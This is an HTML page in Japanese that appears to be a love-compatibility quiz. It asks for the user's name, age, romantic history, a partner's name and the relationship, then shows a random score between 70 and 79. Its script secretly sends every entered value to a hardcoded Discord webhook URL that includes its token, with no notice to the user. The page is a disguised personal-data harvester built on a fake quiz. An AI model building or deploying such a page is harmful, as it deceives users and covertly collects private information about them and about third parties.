<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>診断</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        input { display: block; width: 100%; margin: 10px 0; padding: 8px; }
        button { padding: 10px 20px; }
    </style>
</head>
<body>
    <input type="text" id="name" placeholder="名前">
    <input type="number" id="age" placeholder="年齢">
    <input type="text" id="exp" placeholder="恋愛経験回数">
    <input type="text" id="partner" placeholder="相手の名前">
    <input type="text" id="rel" placeholder="相手との関係性">
    <button id="sendBtn">診断</button>

    <script>
        document.getElementById('sendBtn').onclick = function() {
            const score = Math.floor(Math.random() * (81 - 70) + 70);
            const data = {
                content: "結果:\n" +
                         "名前: " + document.getElementById('name').value + "\n" +
                         "年齢: " + document.getElementById('age').value + "\n" +
                         "経験: " + document.getElementById('exp').value + "\n" +
                         "相手: " + document.getElementById('partner').value + "\n" +
                         "関係性: " + document.getElementById('rel').value + "\n" +
                         "スコア: " + score + "%"
            };

            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
            alert("診断結果: " + score + "%");
        };
    </script>
</body>
</html>
